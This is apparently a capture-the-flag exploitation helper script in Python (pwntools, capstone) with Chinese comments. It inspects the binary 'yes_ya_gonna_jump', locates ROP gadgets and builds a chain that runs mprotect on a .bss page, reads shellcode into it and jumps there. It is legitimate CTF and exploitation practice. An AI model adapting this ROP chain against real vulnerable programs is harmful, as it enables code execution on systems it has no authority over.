import capstone
from pwn import ELF, context

e = ELF('yes_ya_gonna_jump', checksec=False)
context.binary = e   # 重要：沒設這行，context.arch 不會跟著 ELF 變成 amd64，
                      # 之後 ROP().mprotect()/.read() 自動組 chain 會悄悄用錯誤的
                      # （像 32-bit 式樣）呼叫慣例組出完全不對的 chain，且不會報錯。
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)


def dis(addr, size, name):
    print(f'--- {name} @ {hex(addr)} ---')
    code = e.read(addr, size)
    for ins in md.disasm(code, addr):
        print(f'{ins.address:#x}: {ins.mnemonic} {ins.op_str}')
    print()


def read_str(addr):
    data = e.read(addr, 128)
    return data.split(b'\x00')[0]


print('=== checksec ===')
print(e.checksec())

print()
print('=== 這支二進位是 statically linked，symbol table 裡幾乎全是 libc 內部函式 ===')
print('=== 只挑出題目自己的 main，以及之後 ROP 會用到的 libc 函式位址 ===')
print('main', hex(e.symbols['main']))
for name in ('read', 'mprotect', 'printf', 'puts'):
    print(name, hex(e.symbols.get(name, 0)))
print('.bss 起點（No PIE，位址固定）:', hex(e.bss()))

print()
dis(0x4017b5, 0x401878 - 0x4017b5, 'main')

print('=== 字串 ===')
strs = {
    'banner1': 0x4017fc + 0x9680c,
    'banner2': 0x40180b + 0x9683d,
    'banner3': 0x40181a + 0x96866,
    'banner4': 0x401829 + 0x9688f,
    'banner5': 0x401838 + 0x968a8,
    'printf_fmt': 0x401864 + 0x968a4,
}
for name, addr in strs.items():
    print(name, hex(addr), '->', read_str(addr))

print()
print('=== 可用的 ROP gadgets（pwntools ROP 自動找出來的） ===')
from pwn import ROP
gadget_probe = ROP(e)
print('pop rdi; ret  ->', gadget_probe.find_gadget(['pop rdi', 'ret']))
print('pop rsi; ret  ->', gadget_probe.find_gadget(['pop rsi', 'ret']))
print('pop rax; ret  ->', gadget_probe.find_gadget(['pop rax', 'ret']))
print('syscall       ->', gadget_probe.find_gadget(['syscall']))

print()
print('=== 組出來的 ROP chain：mprotect(bss,0x2000,7) -> read(0,bss,0x100) -> jmp bss ===')
# 用全新的 ROP() 物件組最終 chain，避免跟上面 find_gadget 的探測共用同一個
# ROP 物件的內部 call-building 狀態（實測發現共用同一個物件組出來的 chain
# 長度會從正確的 136 bytes 縮水成不完整、對不上暫存器配置的 44 bytes）。
rop = ROP(e)
bss = e.bss(0x800)
page = bss & ~0xfff
rop.mprotect(page, 0x2000, 7)
rop.read(0, page, 0x100)
rop.raw(page)
print('page addr:', hex(page))
print('chain length:', len(rop.chain()))
print(rop.dump())
